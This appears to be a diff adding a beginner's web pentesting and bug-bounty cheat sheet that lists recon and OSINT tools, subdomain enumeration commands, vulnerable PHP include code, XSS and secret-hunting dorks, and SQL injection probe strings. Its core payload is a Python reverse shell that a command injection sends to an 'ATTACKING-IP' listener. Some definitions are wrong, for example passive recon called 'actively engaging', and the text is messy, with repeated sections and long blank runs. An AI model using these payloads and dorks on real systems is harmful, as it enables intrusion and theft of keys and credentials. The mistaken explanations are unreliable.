@@ -1,0 +1,380 @@
+Website Ethical Hacking and Pentesting
+
+Recon: Reconnaissance is the practice of covertly discovering and collecing information about a system. In other words, recon is the process of obtaining information about the position,activities, resources, etc.
+
+Active reconnaissance is a type of computer attack in which an intruder engages with the targeted system to gather information about vulnerabilities. This may be through automated scanning or manual testing using various tools like ping, traceroute, netcat, etc. This type of recon requires that the attacker interact with the target. This recon is raster and more accurate, but it also makes much more noise.
+
+Passive reconnaissance is an attempt to gain information about targeted computers and networks by actively engaging with the systems. It is gathering the information without alerting the victim host, which drastically increases security against the attack.
+
+What kind of Information we are need::
+
+Network Information
+	* Ip Address
+	* Domain names
+	* services
+	* VPN/IDS/IPS/Firewall Information
+
+Operating System Information 
+	* user/group name
+	* Service Information
+	* System Architecture
+	* System Type
+
+Public Network
+	* Network 
+	* Phone<email
+	* DNS, WhoIs
+	* Social Network, Dorking, Social Media
+	* Archive Machine, Website, Source Code, Site Map
+
+Internal network
+	* Private Ip Address, Local Website , Internal DNS
+
+Website:
+	* Look at the website carefully
+	* Look at the sitemap
+	* find external link
+	* look at the source code
+	* Mirror te website(wget)
+	* Try to find old link(Archive.org)
+	* If not found any contact number or any personal Information then whois
+
+waybackurls <link> for showing all previous and present links
+inurl:php.id==? site:.in for finding website
+https://who.is/ for whois Information
+https://ipinfo.info/ for knowing the ip
+phoneinfoga scan -p "phone number"
+python3 ghunt.py gmail "abc@xyz"
+https://dnsdumpster.com/
+https://subdomainfinder.c99.nl/
+https://osint.sh/subdomain/
+https://bgp.he.net/
+https://search.censys.io/
+python3 linkfinder.py -i <link>
+arjun -u <link>
+
+
+https://github.com/smicallef/spiderfoot
+https://github.com/kennbroorg/iKy
+https://github.com/owasp-amass/amass
+https://github.com/JehadAlqurashi/BlackDir-Framework
+
+amass intel -orrg att
+
+
+
+
+Subdomain Enumeration::
+
+https://subdomainfinder.c99.nl/
+https://osint.sh/subdomain/
+https://hackertarget.com/find-dns-host-records/
+https://crt.sh/
+https://github.com/aboul3la/Sublist3r
+https://github.com/owasp-amass/amass
+https://github.com/projectdiscovery/subfinder
+https://github.com/guelfoweb/knock
+https://github.com/TheRook/subbrute
+https://github.com/michenriksen/aquatone
+https://github.com/Findomain/Findomain
+https://github.com/lanmaster53/recon-ng
+https://github.com/nsonaniya2010/SubDomainizer
+https://github.com/infosec-au/altdns
+https://github.com/tomnomnom/assetfinder
+
+
+assetfinder google.com | httpx -status-code -title
+sublit3r -d google.com -b
+amass enum -passive -d google.com
+
+
+
+
+Os Command Injection::
+
+payload ::
+
+;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+; itis must
+
+ATTACKING-IP,80 >> your ip,your port
+
+
+Trigger :: nc -lvnp port
+
+Cheatsheet :: https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+This is Blind Os Command Injection and also RCE
+
+
+
+
+LFI : This vulnerability arises when the user controllable input is being used to include a file from the server without proper check
+
+in php :
+include(),include_onece(),require_once() and sometimes fopen() function are responsible for LFI Vulnerability
+
+Code Example :
+
+POST based LFI:					GET based LFI:
+<?						<?
+$page=$_POST['page'];				$page=$_GET['page'];
+include $page;					include $page;
+?>						?>
+
+
+Parameter :: file, document, folder, root, path, page, style, pdf, template, php_pah, doc
+
+
+
+IDOR :
+
+* Insecure Direct Object Reference 
+* Change value of Parameter
+
+Exaample :
+	https://example.com/bank?account_number=1234
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Find blind XSS endpoints
+1. Visit your email client like Gmail etc.
+2. Search for Unsubscribe/feedback/Manage preferences.
+3. Click on Unsubscribe and put BXSS payload if they ask for any feedback
+
+
+
+Google Dork To Open Redirect
+site:*.target.com inurl:%2f
+%2f Is the URL encoding for /
+
+
+I found lot bugs using this dorks in github 
+"Target.com" language:yml 
+"Target. com" language:yml "_key"
+"Target. com" language:yml "admin"
+"Target. com" language:yml "root"
+"Target. com" language:yml "host"
+
+
+Xss Dorks By SoulCoder
+*-----------------------------------*
+inurl:".php?cmd="
+inurl:".php?z="
+inurl:".php?q="
+inurl:".php?search="
+inurl:".php?query="
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback="
+inurl:".php?mail="
+inurl:".php?cat="
+inurl:".php?vote="
+inurl:search.php?q=
+inurl:com_feedpostold/feedpost.php?url=
+inurl:scrapbook.php?id=
+inurl:headersearch.php?sid=
+inurl:/poll/default.asp?catid=
+inurl:/search_results.php?search=
+
+----------------------------------------------------------------------
+Bug Bounty Tips
+This is how to find sql-Injection 100% of the time
+
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'⠟⠞⠺⠺⠺'   <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+/?q=")
+/?q=')
+/?q=-x()
+
+----------------------------------------------------------------------
+🔥Best Info Researcher for OSINT🔥
+
+https://github.com/jivoi/awesome-osint
+https://github.com/tracelabs/awesome-osint
+https://awesomeopensource.com/projects/osint
+https://osint.link/
+https://github.com/priyankvadaliya/AwsomeOSINT
+https://osintframework.com/
+https://www.toddington.com/resources/free-osint-resources-open-source-intelligence-search-tools-research-tools-online-investigation/
+https://gijn.org/online-research-tools/
+https://www.osinttechniques.com/osint-tools.html
+https://iamciso.wordpress.com/osint/tools/
+https://rr.reuser.biz/
+https://www.symbaloo.com/mix/osintsearchtools
+----------------------------------------------------------------------
+​​Bug Bounty Beginner's Roadmap
+
+This is a resource factory for anyone looking forward to starting bug hunting and would require guidance as a beginner.
+
+https://github.com/bittentech/Bug-Bounty-Beginner-Roadmap
+----------------------------------------------------------------------
+I found lot bugs using this dorks in github 
+
+"Target.com" language:yml 
+"Target. com" language:yml "_key"
+"Target. com" language:yml "admin"
+"Target. com" language:yml "root"
+"Target. com" language:yml "host"
+
+/wp-json/wp/v2/users
+/wp/wp-admin/install.php
+/wp/wp-admin/upgrade.php
+/wp-admin/install.php
+/wp-admin/install.php
